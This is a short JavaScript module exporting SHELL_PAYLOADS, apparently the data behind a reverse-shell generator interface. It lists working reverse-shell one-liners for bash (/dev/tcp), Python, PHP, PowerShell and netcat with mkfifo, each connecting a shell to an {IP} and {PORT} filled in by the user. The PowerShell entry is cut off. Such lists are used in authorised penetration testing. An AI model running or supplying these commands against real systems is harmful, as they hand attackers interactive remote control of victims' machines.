export const SHELL_PAYLOADS = [
  {
    name: "Bash -i",
    category: "Linux",
    command: "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
    color: "text-green-400"
  },
  {
    name: "Python 3",
    category: "Linux / Mac",
    command: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
    color: "text-blue-400"
  },
  {
    name: "PHP One-Liner",
    category: "Web Shell",
    command: "php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    color: "text-purple-400"
  },
  {
    name: "PowerShell (Base64)",
    category: "Windows",
    command: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{IP}\",{PORT});...", // Truncated for brevity
    color: "text-blue-600"
  },
  {
    name: "NC Mkfifo",
    category: "Linux",
    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
    color: "text-orange-400"
  }
];